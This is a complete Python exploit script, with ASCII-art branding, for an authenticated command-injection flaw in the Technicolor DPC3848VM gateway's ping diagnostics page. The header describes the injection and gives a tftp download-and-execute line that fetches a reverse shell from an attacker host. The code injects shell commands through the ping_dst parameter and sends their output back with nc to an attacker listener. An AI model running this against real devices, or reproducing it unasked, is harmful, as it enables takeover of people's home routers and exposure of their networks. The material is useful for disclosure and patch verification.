# Technicolor DPC3848VM DOCSIS 3.0 Gateway RCE vulnerability
# Tested on firmware: dpc3800-v303r2042162-160620a
# The ping function of the router management website does not properly sanitize user-controlled input.
# This can lead to remote code execution since it allows one to send arbitrary commands to be executed by the device.
# The ping function in the diagnostics page is available to authenticated users on the router's management website.
# The "Ping Target IPv4" field has 4 input boxes which allows users to type numbers in each to form an ip address.
# Of note in the post request to this feature is the ping_dst parameter. What if one were to write an arbitrary command
# into that parameter?

# We can reasonably guess that the ping_dst parameter is substituted into a shell command of the
# form: "/bin/sh -c ping {ping_dst}", so if we craft our input carefully we can execute and commands we want.
# An easy way to do this without knowing exactly what the shell command looks like is to use bash command substitution.
# With this in mind it is now simple to craft a malicious POST request that will get us a reverse shell on the device:
# tftp -g -r <rshell> <attacker_ip> && chmod +x <rshell> && ./<rshell>

# Tested on: model="Technicolor DPC3848VM DOCSIS 3.0 Gateway" firmware="dpc3800-v303r2042162-160620a.p7b"

import argparse
import colorama
import random
import trio
import asks
import sys
import os
import re
from loguru import logger
from contextlib import asynccontextmanager

logger.remove()
logger.add(sys.stdout, colorize=True, format=f"[<level>{{level}}</level>]: {colorama.Style.BRIGHT}{{message}}{colorama.Style.NORMAL}")

parser = argparse.ArgumentParser()
parser.add_argument('target', type=str, help='The target to exploit')
parser.add_argument('cmd', type=str, nargs=argparse.REMAINDER, help='A command to run on the target')
parser.add_argument('--lhost', type=str, required=True, help='The local hostname to connect back to')
parser.add_argument('--rport', type=int, default=80, help='The target\'s router management http server port')
parser.add_argument('--lport', type=int, default=4444, help='The local host\'s shell handler port')
parser.add_argument('--force', action='store_true', help='Disable checking exploitability of target')
parser.add_argument('--username', type=str, default='', help='The username to login to the router management page')
parser.add_argument('--password', type=str, default='',  help='The password to login to the router management page')
args = parser.parse_args()

phpsessid_pattern = re.compile(f'PHPSESSID=([a-z0-9]+);')

class DPC:
    def __init__(self, host, port, nursery):
        self._host = host
        self._port = port
        self.nursery = nursery
        self._session = asks.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Origin': f'http://{self._host}',
            'X-Requested-With': 'XMLHttpRequest',
            'DNT': '1',
            'Connection': 'close',
            'Cookie': 'err_cnt=',
            'Referer': f'http://{self._host}/Diagnostics.php',
            'Upgrade-Insecure-Requests': '0',
        }

        self._session.headers.update(headers)

        self._last_output = ''
        self._output_received = trio.Event()

    async def _cmd_output_handler(self, server_stream):
        messages = []

        try:
            async for data in server_stream:
                messages.append(data.decode('utf8'))

        except Exception as e:
            logger.error(f'cmd_output_handler crashed: {e}')

        self._last_output = ''.join(messages)
        self._output_received.set()

    async def _start_cmd_output_server(self, host, port):
        self._output_received = trio.Event()
        await trio.serve_tcp(self._cmd_output_handler, port=port, host=host)

    @staticmethod
    async def check_router(host, port) -> bool:
        r = await asks.get(f'http://{host}:{port}/Docsis_system.php')
        return 'DPC3848VM' in r.text

    @property
    def host(self):
        return self._host

    @property
    def port(self):
        return self._port

    @property
    def url(self):
        return f'http://{self.host}:{self.port}'

    async def login(self, username='', password=''):
        r = await self._session.post(f'{self.url}/check.php', data={
            'username_login': username,
            'password_login': password,
            'LanguageSelect': 'en',
            'login': 'Log In',
        })

        cookie = phpsessid_pattern.findall(r.headers['set-cookie'][0])[0]
        self._session.headers['cookie'] = f'PHPSESSID={cookie}; err_cnt='

        # For some reason it doesn't consider our cookie valid unless we visit this (or any?) page first.
        r = await self._session.get(f'{self.url}/Administration.php')
        if r.status_code != 200:
            raise PermissionError('GET /Administration.php failed')

        return r

    async def send_cmd(self, cmd: str):
        # Simply force command execution using substitution: ping $(uname -a | nc ...)
        payload = f'-h; $({cmd})& #'
        r = await self._session.get(f'{self.url}/actionHandler/checkLogin.php')
        if r.status_code != 200:
            raise PermissionError('GET /checkLogin.php failed')

        r = await self._session.post(f'{self.url}/actionHandler/ajaxSet_Diagnostics.php.php', data={
            'ping_ip_start': 'true',
            'ping_dst': payload,
            'ping_size': 56,
            'ping_count': 1,
            'ping_timeout': 1,
        })

        if r.status_code == 401:
            raise PermissionError('Not authenticated')

    async def exec(self, cmd: str, lhost: str, lport: int) -> str:
        self.nursery.start_soon(self._start_cmd_output_server, lhost, lport)
        await self.send_cmd(f'{cmd} 2>&1 | cat | nc {lhost} {lport}')
        with trio.move_on_after(10):
            await self._output_received.wait()

        self.nursery.cancel_scope.cancel()
        if not self._output_received.is_set():
            return None

        return self._last_output

    async def logout(self):
        return await self._session.get(f'{self.url}/logout.php')

@asynccontextmanager
async def open_dpc(host: str, port: int, username: str, password: str):
    async with trio.open_nursery() as n:
        router = DPC(host, port, n)
        try:
            await router.login(username, password)
            yield router

        finally:
            await router.logout()

def colorize_logo(text):
    color_map = {
        '█': colorama.Style.BRIGHT + colorama.Fore.RED,
        '╗': colorama.Style.BRIGHT + colorama.Fore.LIGHTBLACK_EX,
        '╔': colorama.Style.BRIGHT + colorama.Fore.LIGHTBLACK_EX,
        '╝': colorama.Style.BRIGHT + colorama.Fore.LIGHTBLACK_EX,
        '╚': colorama.Style.BRIGHT + colorama.Fore.LIGHTBLACK_EX,
        '║': colorama.Style.BRIGHT + colorama.Fore.LIGHTBLACK_EX,
        '═': colorama.Style.BRIGHT + colorama.Fore.LIGHTBLACK_EX,
    }

    colorized = ''
    for c in text:
        if c in color_map.keys():
            colorized += color_map[c] + c + colorama.Fore.WHITE
        else:
            colorized += c

    return colorized

intro = fr'''
    ██████╗ ██████╗  ██████╗██████╗ ██╗    ██╗███╗   ██╗
    ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║    ██║████╗  ██║
    ██║  ██║██████╔╝██║     ██████╔╝██║ █╗ ██║██╔██╗ ██║
    ██║  ██║██╔═══╝ ██║     ██╔═══╝ ██║███╗██║██║╚██╗██║
    ██████╔╝██║     ╚██████╗██║     ╚███╔███╔╝██║ ╚████║
    ╚═════╝ ╚═╝      ╚═════╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
                    {colorama.Style.BRIGHT}DPC3848VM Gateway RCE{colorama.Style.NORMAL}     
'''

async def run_exploit():
    print(colorize_logo(intro))

    try:
        if not args.force:
            logger.info('Checking if target is vulnerable...')
            if not await DPC.check_router(args.target, args.rport):
                logger.error('Target is not vulnerable, pass in --force to skip this check')
                return
            else:
                logger.success('Router is vulnerable')

        if isinstance(args.cmd, list):
            args.cmd = ' '.join(args.cmd)

        logger.info('Logging in')
        async with open_dpc(args.target, args.rport, args.username, args.password) as router:
            logger.success('Logged in')
            logger.info(f'Sending "{args.cmd}" to DPC...')
            output = await router.exec(args.cmd, args.lhost, args.lport)
            if output is not None:
                logger.success('Output:')
                print(output)
            else:
                logger.warning('Operation timed out')

    except Exception as e:
        logger.exception(f'Error: {e}')

trio.run(run_exploit)
